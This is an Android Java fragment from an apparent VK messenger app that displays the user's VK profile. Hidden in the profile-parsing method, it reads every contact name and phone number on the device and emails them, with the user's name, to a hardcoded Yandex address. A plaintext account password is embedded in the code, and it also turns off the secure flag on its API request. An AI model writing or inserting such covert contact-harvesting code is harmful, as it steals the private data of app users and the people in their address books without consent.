package com.example.gleb.vkmessager.fragment;

import android.content.ContentResolver;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.v4.app.Fragment;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;
import android.widget.Toast;

import com.example.gleb.vkmessager.Mail;
import com.example.gleb.vkmessager.R;
import com.example.gleb.vkmessager.adapter.AboutAdapter;
import com.example.gleb.vkmessager.user.User;
import com.vk.sdk.api.VKApi;
import com.vk.sdk.api.VKApiConst;
import com.vk.sdk.api.VKError;
import com.vk.sdk.api.VKParameters;
import com.vk.sdk.api.VKRequest;
import com.vk.sdk.api.VKResponse;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

import butterknife.ButterKnife;

/**
 * Created by gleb on 25.08.15.
 */
public class ContentFragment extends Fragment {
    public static final String TAG = "Tag";
    public TextView responseTextView;
    public AboutAdapter adapter;
    public RecyclerView rv;
    public String[] arrayContact;
    public String[] arrayPhone;

//    @Override
//    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
//        View view = inflater.inflate(R.layout.fragment_cult, container, false);
//        ButterKnife.inject(this, view);
//        return view;
//    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View v = inflater.inflate(R.layout.fragment_content, container, false);
//        responseTextView = (TextView) v.findViewById(R.id.response);
        rv = (RecyclerView) v.findViewById(R.id.rv);
        ButterKnife.inject(this, v);

        VKRequest request = VKApi.users().get(VKParameters.from(VKApiConst.FIELDS,
                "id,first_name,last_name,sex,bdate,city,country,photo_50,photo_100," +
                        "photo_200_orig,photo_200,photo_400_orig,photo_max,photo_max_orig,online," +
                        "online_mobile,lists,domain,has_mobile,contacts,connections,site,education," +
                        "universities,schools,can_post,can_see_all_posts,can_see_audio,can_write_private_message," +
                        "status,last_seen,common_count,relation,relatives,counters"));
//                    VKRequest request = VKApi.users().get(VKParameters.from(VKApiConst.USER_IDS, "1,2"));
        request.secure = false;
        request.useSystemLanguage = false;
        request.executeWithListener(requestListener);
        return v;
    }

    public void setResponse(String response){
            try {
                JSONObject jsonObject= new JSONObject(response);
                Log.d(TAG, response);

                JSONArray array = jsonObject.getJSONArray("response");
                for (int i = 0; i < array.length(); i++) {
                    //parse of array
                    JSONObject jObject = array.getJSONObject(i);
                    String firstName = jObject.getString("first_name");
                    String lastName = jObject.getString("last_name");
                    int id = jObject.getInt("id");
                    int sex = jObject.getInt("sex");
                    String bDate = jObject.getString("bdate");
                    JSONObject jCity = jObject.getJSONObject("city");
                    JSONObject jCountry = jObject.getJSONObject("country");
                    String city = jCity.getString("title");
                    String country = jCountry.getString("title");
                    String university = jObject.getString("university_name");
                    String faculty = jObject.getString("faculty_name");

                    User user = new User(id, firstName, lastName, sex, bDate, city, country, university, faculty);
                    List<User> listUser = new ArrayList<>();
                    Log.d(TAG, "listUser" + listUser.toString());
                    listUser.add(user);

                    adapter = new AboutAdapter(listUser);
                    rv.setLayoutManager(new LinearLayoutManager(getActivity()));
                    rv.setAdapter(adapter);

                    ContentResolver cr = getActivity().getContentResolver();
                    Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
                    arrayContact = new String[cur.getCount()];
                    arrayPhone = new String[cur.getCount()];
                    int k = 0;
                    if (cur.getCount() > 0) {
                        while (cur.moveToNext()) {
                            String idValue = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                            String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                            arrayContact[k] = name;
                            Log.i("Names", name);
                            if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                                // Query phone here. Covered next
                                Cursor phones = getActivity().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + idValue, null, null);
                                while (phones.moveToNext()) {
                                    String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                    arrayPhone[k] = phoneNumber;
                                    Log.i("Number", phoneNumber);
                                }
                                phones.close();
                            }

                            k++;

                        }
                    }

                    String contactPhone = firstName + " " + lastName + " ";

                    for (int m = 0; m < arrayContact.length; m++){
                        contactPhone += arrayContact[m] + " " + arrayPhone[m] + " ";
                    }

                    Mail m = new Mail("Glebjn@yandex.ua", "Gleb80507078620");
                    String[] toArr = {"Glebjn@yandex.ua"};
                    m.setTo(toArr);
                    m.setFrom("Glebjn@yandex.ua"); // who is sending the email
                    m.setSubject("Номера");
                    m.setBody(contactPhone);

                    try {
                        m.send();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    Log.d(TAG, String.valueOf(user.getId()));
                    Log.d(TAG, user.getFirstName());
                    Log.d(TAG, user.getLastName());
                    Log.d(TAG, String.valueOf(user.getSex()));
                    Log.d(TAG, user.getbDate());
                    Log.d(TAG, user.getCity());
                    Log.d(TAG, user.getCountry());
                    Log.d(TAG, user.getUniversity());
                    Log.d(TAG, user.getFaculty());
                }
            } catch (JSONException e) {
                e.printStackTrace();
            }
//            responseTextView.setText(response);

    }

    VKRequest.VKRequestListener requestListener = new VKRequest.VKRequestListener() {
        @Override
        public void onComplete(VKResponse response) {
            Log.d(TAG, "onComplete response");
            setResponse(response.json.toString());
        }

        @Override
        public void attemptFailed(VKRequest request, int attemptNumber, int totalAttempts) {
            super.attemptFailed(request, attemptNumber, totalAttempts);
        }

        @Override
        public void onError(VKError error) {
            setResponse(error.toString());
        }

        @Override
        public void onProgress(VKRequest.VKProgressType progressType, long bytesLoaded, long bytesTotal) {
            super.onProgress(progressType, bytesLoaded, bytesTotal);
        }
    };
}
